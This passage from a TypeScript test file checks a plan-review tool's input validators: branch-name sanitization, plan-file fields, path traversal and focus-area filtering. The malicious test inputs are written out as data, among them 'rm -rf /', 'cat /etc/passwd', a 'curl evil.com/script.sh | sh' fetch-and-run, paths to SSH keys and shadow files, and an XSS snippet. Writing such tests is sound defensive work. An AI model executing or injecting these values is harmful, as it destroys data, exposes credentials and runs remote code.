      getReviewerPrompt: (contextContent: string) => ({
        prompt: contextContent,
      }),
    }));

    const prompt = buildReviewPrompt(
      currentPlan,
      diffResult,
      [parentWithoutDetails],
      [childWithoutDetails]
    );

    // Should include basic info but not try to include missing details
    expect(prompt).toContain('**Parent Plan ID:** 99');
    expect(prompt).toContain('**Parent Title:** Parent Plan');
    expect(prompt).toContain('**Parent Goal:** Parent goal');
    expect(prompt).not.toContain('**Parent Details:**');

    expect(prompt).toContain('**Child Plan ID:** 101');
    expect(prompt).toContain('**Child Title:** Child Plan');
    expect(prompt).toContain('**Child Goal:** Child goal');
    expect(prompt).not.toContain('**Child Details:**');
  });
});

// Security tests for the implemented security fixes
describe('Security fixes', () => {
  describe('Branch name sanitization', () => {
    test('rejects branch name with command injection attempts', async () => {
      // Test branch names that could potentially be used for command injection
      const maliciousBranches = [
        'main; rm -rf /',
        'main && echo "hacked"',
        'main | cat /etc/passwd',
        'main`echo hacked`',
        'main$(echo hacked)',
        'main & echo hacked &',
        'main\nrm -rf /',
        'main; cat /etc/passwd > output.txt',
        'main || curl evil.com/script.sh | sh',
        '../../../main',
        '..\\..\\main',
      ];

      for (const maliciousBranch of maliciousBranches) {
        // Test the sanitization function directly
        expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');
      }
    });

    test('accepts valid branch names', async () => {
      const validBranches = [
        'main',
        'master',
        'feature/new-feature',
        'bugfix/issue-123',
        'release-1.0.0',
        'dev',
        'staging',
        'feature_branch',
        'hotfix.urgent',
        'user/john/feature',
        'v1.2.3',
      ];

      for (const validBranch of validBranches) {
        // Test the sanitization function directly instead of the full generateDiffForReview
        // since mocking Bun's $ utility is complex

        // Should not throw an error for valid branch names
        expect(() => sanitizeBranchName(validBranch)).not.toThrow();
        expect(sanitizeBranchName(validBranch)).toBe(validBranch);
      }
    });

    test('sanitizes branch name in both git and jj modes', async () => {
      const maliciousBranch = 'main; rm -rf /';

      // Test the sanitization function directly - it should reject malicious input
      expect(() => sanitizeBranchName(maliciousBranch)).toThrow('Invalid branch name format');

      // The sanitizeBranchName function is used in both git and jj code paths in generateDiffForReview
      // So testing it directly verifies protection in both modes
    });
  });

  describe('Input validation for plan files', () => {
    test('validates plan has required goal field', async () => {
      const planContent = `
id: 1
title: Test Plan
# Missing goal field
tasks:
  - title: Test task
    description: A test task
`;
      const planFile = join(testDir, 'no-goal.yml');
      await writeFile(planFile, planContent);

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          // No goal field
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        "Plan file is missing required 'goal' field"
      );
    });

    test('validates plan has at least one task', async () => {
      const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks: []
`;
      const planFile = join(testDir, 'no-tasks.yml');
      await writeFile(planFile, planContent);

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        'Plan file must have at least one task'
      );
    });

    test('validates tasks have required title field', async () => {
      const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - description: Task without title
`;
      const planFile = join(testDir, 'invalid-task.yml');
      await writeFile(planFile, planContent);

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              // No title field
              description: 'Task without title',
            },
          ],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        "Task 1 is missing required 'title' field"
      );
    });

    test('validates tasks have required description field', async () => {
      const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - title: Task without description
`;
      const planFile = join(testDir, 'invalid-task-desc.yml');
      await writeFile(planFile, planContent);

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Task without description',
              // No description field
            },
          ],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        "Task 1 is missing required 'description' field"
      );
    });

    test('validates multiple tasks correctly', async () => {
      const planFile = join(testDir, 'multiple-invalid-tasks.yml');

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Valid task',
              description: 'This task is valid',
            },
            {
              // Missing title and description
            },
          ],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        "Task 2 is missing required 'title' field"
      );
    });
  });

  describe('Large diff protection', () => {
    test('has correct size limit constant', async () => {
      // Test that the MAX_DIFF_SIZE constant is properly set to 10MB
      const reviewModule = await import('./review.js');
      // We can't directly access the constant, but we can test the logic indirectly

      // Create a string that exceeds 10MB (10 * 1024 * 1024 bytes)
      const largeDiff = 'a'.repeat(11 * 1024 * 1024); // 11MB
      const largeDiffSizeInBytes = Buffer.byteLength(largeDiff, 'utf8');

      expect(largeDiffSizeInBytes).toBeGreaterThan(10 * 1024 * 1024);

      // The protection logic uses Buffer.byteLength to check size, which is the right approach
      // for UTF-8 string length checking
    });

    test('diff size calculation works correctly', () => {
      // Test that byte length calculation works correctly for different string types
      const smallString = 'hello';
      const mediumString = 'a'.repeat(1024); // 1KB
      const unicodeString = '🔒'.repeat(100); // Unicode characters take more bytes

      expect(Buffer.byteLength(smallString, 'utf8')).toBe(5);
      expect(Buffer.byteLength(mediumString, 'utf8')).toBe(1024);
      expect(Buffer.byteLength(unicodeString, 'utf8')).toBeGreaterThan(100); // Unicode takes more bytes
    });
  });

  describe('Error handling improvements', () => {
    test('error message format includes exit codes and stderr', () => {
      // Test that our error message format includes the expected information
      const exitCode = 128;
      const stderr = 'fatal: not a git repository';
      const expectedMessage = `git diff --name-only command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('git diff --name-only command failed');
      expect(expectedMessage).toContain('exit code 128');
      expect(expectedMessage).toContain('fatal: not a git repository');
    });

    test('jj error message format includes exit codes and stderr', () => {
      // Test that our jj error message format includes the expected information
      const exitCode = 1;
      const stderr = 'Error: No jj repo in current directory';
      const expectedMessage = `jj diff --summary command failed (exit code ${exitCode}): ${stderr}`;

      expect(expectedMessage).toContain('jj diff --summary command failed');
      expect(expectedMessage).toContain('exit code 1');
      expect(expectedMessage).toContain('Error: No jj repo in current directory');
    });

    test('error context wrapping format', () => {
      // Test that error wrapping preserves the original error message
      const originalError = 'Unexpected error';
      const wrappedMessage = `Failed to generate git diff: ${originalError}`;

      expect(wrappedMessage).toContain('Failed to generate git diff');
      expect(wrappedMessage).toContain('Unexpected error');
    });

    test('handles executor errors properly in review command', async () => {
      const planContent = `
id: 1
title: Test Plan
goal: Test goal
tasks:
  - title: Test task
    description: A test task
`;
      const planFile = join(testDir, 'error-test.yml');
      await writeFile(planFile, planContent);

      const mockExecutor = {
        execute: async () => {
          throw new Error('Network timeout');
        },
      };

      await moduleMocker.mock('../plans.js', () => ({
        resolvePlanFile: async () => planFile,
        readPlanFile: async () => ({
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        }),
      }));

      await moduleMocker.mock('../configLoader.js', () => ({
        loadEffectiveConfig: async () => ({}),
      }));

      await moduleMocker.mock('../executors/index.js', () => ({
        buildExecutorAndLog: () => mockExecutor,
        DEFAULT_EXECUTOR: 'copy-only',
      }));

      await moduleMocker.mock('../../common/git.js', () => ({
        getGitRoot: async () => testDir,
      }));

      await moduleMocker.mock('./review.js', () => ({
        handleReviewCommand,
        generateDiffForReview: async () => ({
          hasChanges: true,
          changedFiles: ['test.ts'],
          baseBranch: 'main',
          diffContent: 'test diff',
        }),
        buildReviewPrompt: (planData: any, diffResult: any, parentChain: any[] = [], completedChildren: any[] = [], customInstructions?: string) => 'test prompt',
      }));

      const mockCommand = {
        parent: {
          opts: () => ({}),
        },
      };

      await expect(handleReviewCommand(planFile, {}, mockCommand)).rejects.toThrow(
        'Review execution failed: Network timeout'
      );
    });
  });

  describe('Path traversal protection', () => {
    test('prevents path traversal attacks in instruction files', () => {
      const gitRoot = '/safe/project';
      const maliciousPaths = [
        '../../../etc/passwd',
        '../../home/user/.ssh/id_rsa', 
        '/etc/passwd',
        'C:\\Windows\\System32\\config\\SAM',
        '../../../var/log/auth.log',
        '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts',
        '../../../../../../../../etc/shadow',
        'file:///etc/passwd',
        '\0/etc/passwd',
      ];

      for (const maliciousPath of maliciousPaths) {
        expect(() => validateInstructionsFilePath(maliciousPath, gitRoot)).toThrow(
          /Instructions file path is outside the allowed directory|Instructions file path contains dangerous directory/
        );
      }
    });

    test('allows safe paths within git root', () => {
      const gitRoot = '/safe/project';
      const safePaths = [
        'docs/review-instructions.md',
        './custom-instructions.txt',
        'config/review/instructions.md',
        'review-guidelines.txt',
        'subdir/instructions.md',
      ];

      for (const safePath of safePaths) {
        expect(() => validateInstructionsFilePath(safePath, gitRoot)).not.toThrow();
        const result = validateInstructionsFilePath(safePath, gitRoot);
        expect(result).toContain(gitRoot);
      }
    });

    test('handles absolute paths within git root', () => {
      const gitRoot = '/safe/project';
      const safeAbsolutePath = '/safe/project/instructions.md';
      
      expect(() => validateInstructionsFilePath(safeAbsolutePath, gitRoot)).not.toThrow();
      const result = validateInstructionsFilePath(safeAbsolutePath, gitRoot);
      expect(result).toBe(safeAbsolutePath);
    });

    test('validates input types for file path', () => {
      const gitRoot = '/safe/project';
      
      expect(() => validateInstructionsFilePath('', gitRoot)).toThrow('Instructions file path must be a non-empty string');
      expect(() => validateInstructionsFilePath(null as any, gitRoot)).toThrow('Instructions file path must be a non-empty string');
      expect(() => validateInstructionsFilePath(undefined as any, gitRoot)).toThrow('Instructions file path must be a non-empty string');
    });
  });

  describe('Focus areas validation', () => {
    test('prevents injection attacks in focus areas', () => {
      const maliciousFocusAreas = [
        ['security; rm -rf /'],
        ['performance && echo hacked'],
        ['testing | cat /etc/passwd'],
        ['review`echo hacked`'],
        ['focus$(echo hacked)'],
        ['area\nrm -rf /'],
        ['<script>alert("xss")</script>'],
        ['${process.env.HOME}'],
        ['../../../etc/passwd'],
        ['focus\x00hidden'],
      ];

      for (const maliciousAreas of maliciousFocusAreas) {
        expect(() => validateFocusAreas(maliciousAreas)).toThrow(/Focus area contains invalid characters/);
      }
    });

    test('allows safe focus areas', () => {
      const safeFocusAreas = [
        ['security', 'performance'],
        ['code-quality', 'testing'],
        ['review_guidelines'],
        ['API.design'],
        ['user-experience'],
        ['data_validation'],
        ['error handling'],
        ['documentation'],
      ];

      for (const safeAreas of safeFocusAreas) {
        expect(() => validateFocusAreas(safeAreas)).not.toThrow();
        const result = validateFocusAreas(safeAreas);
        expect(result).toEqual(safeAreas);
      }
    });

    test('enforces focus area limits', () => {
      const tooManyAreas = Array(15).fill('area');
      expect(() => validateFocusAreas(tooManyAreas)).toThrow('Too many focus areas specified');

      const tooLongArea = ['a'.repeat(100)];
      expect(() => validateFocusAreas(tooLongArea)).toThrow('Focus area too long');
    });

    test('filters empty and whitespace-only areas', () => {
      const areasWithEmpty = ['security', '', '   ', 'performance', '\t'];
      const result = validateFocusAreas(areasWithEmpty);
      expect(result).toEqual(['security', 'performance']);
    });

    test('validates input type for focus areas', () => {
      expect(() => validateFocusAreas(null as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas('not-array' as any)).toThrow('Focus areas must be an array');
      expect(() => validateFocusAreas(42 as any)).toThrow('Focus areas must be an array');
    });
  });
});

describe('Custom review instructions', () => {
  test('validateInstructionsFilePath rejects malicious paths and accepts safe ones', () => {
    const gitRoot = '/safe/project';
    
    // Test path traversal protection
    expect(() => validateInstructionsFilePath('../../../etc/passwd', gitRoot)).toThrow();
    expect(() => validateInstructionsFilePath('/etc/passwd', gitRoot)).toThrow();
    
    // Test safe paths
    expect(() => validateInstructionsFilePath('instructions.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('./docs/review.md', gitRoot)).not.toThrow();
  });

  test('validateFocusAreas rejects malicious input and accepts safe areas', () => {
    // Test injection protection
    expect(() => validateFocusAreas(['security; rm -rf /'])).toThrow();
    expect(() => validateFocusAreas(['performance && echo hacked'])).toThrow();
    expect(() => validateFocusAreas(['<script>alert("xss")</script>'])).toThrow();
    
    // Test safe focus areas
    expect(() => validateFocusAreas(['security', 'performance', 'testing'])).not.toThrow();
    expect(validateFocusAreas(['security', 'performance'])).toEqual(['security', 'performance']);
    
    // Test limits
    expect(() => validateFocusAreas(Array(15).fill('area'))).toThrow('Too many focus areas');
    expect(() => validateFocusAreas(['a'.repeat(100)])).toThrow('Focus area too long');
  });

  test('error messages use proper formatting instead of template literals', () => {
    // Test that our error handling fixes work correctly
    const error = new Error('Test error');
    const errorMessage = error instanceof Error ? error.message : String(error);
    expect(errorMessage).toBe('Test error');
    
    // Test string coercion for non-Error objects
    const nonError = { message: 'Not an error object' };
    const nonErrorMessage = nonError instanceof Error ? nonError.message : String(nonError);
    expect(nonErrorMessage).toBe('[object Object]');
  });

  test('properly handles buildReviewPrompt function signature with custom instructions', () => {
    // Test that buildReviewPrompt accepts the customInstructions parameter
    const planData = { id: 1, title: 'Test', goal: 'Test goal', tasks: [] };
    const diffResult = { hasChanges: true, changedFiles: ['test.ts'], baseBranch: 'main', diffContent: 'diff' };
    
    // This should not throw and should work with the new signature
    expect(() => buildReviewPrompt(planData, diffResult, [], [], 'custom instructions')).not.toThrow();
    expect(() => buildReviewPrompt(planData, diffResult, [], [])).not.toThrow();
  });

  test('validates function signatures work correctly after security fixes', () => {
    // Test that all our security functions work as expected
    const gitRoot = '/test/project';
    
    // Test validateInstructionsFilePath with various inputs
    expect(() => validateInstructionsFilePath('safe-file.md', gitRoot)).not.toThrow();
    expect(() => validateInstructionsFilePath('../unsafe', gitRoot)).toThrow();
    
    // Test validateFocusAreas with various inputs
    expect(() => validateFocusAreas(['safe', 'areas'])).not.toThrow();
    expect(() => validateFocusAreas(['unsafe; injection'])).toThrow();
    
    // Test that they return expected values for valid inputs
    const safePath = validateInstructionsFilePath('docs/instructions.md', gitRoot);
    expect(safePath).toContain('docs/instructions.md');
    
    const safeAreas = validateFocusAreas(['security', 'performance']);
    expect(safeAreas).toEqual(['security', 'performance']);
  });
});
